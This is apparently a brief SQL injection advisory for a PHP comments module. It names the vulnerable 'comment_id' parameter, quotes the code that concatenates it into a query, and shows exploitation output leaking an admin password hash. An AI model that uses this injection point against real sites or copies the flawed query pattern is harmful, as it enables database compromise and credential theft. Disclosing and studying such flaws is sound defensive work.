# Vulnerability
Remote attacker can inject sql codes to the system that host target
web application. Its high level vulnerability.

modules/comments/json.php:
23	$comment = $comments->get_comment(($_REQUEST['comment_id']));


In json.php 'get_comment' method called with value of HTTP Request
that's name 'comment_id'. In the 'get_comment' method, variable
'$comment_id' inserted to sql query and executed by application.

modules/comments/classes/comments.class.inc.php:
function get_comment($comment_id)
{
$this->query("SELECT * FROM co_comments WHERE id=".$this->escape($comment_id));
...

'escape' method can't prevent because attacker don't need single
quotes for successful exploitation.

# Exploitation

1:00","comments":"admin:$1$sM5wjKS9$wJPfZZWO53uu8eCxjOesS\/","user_name":""},"success":true}
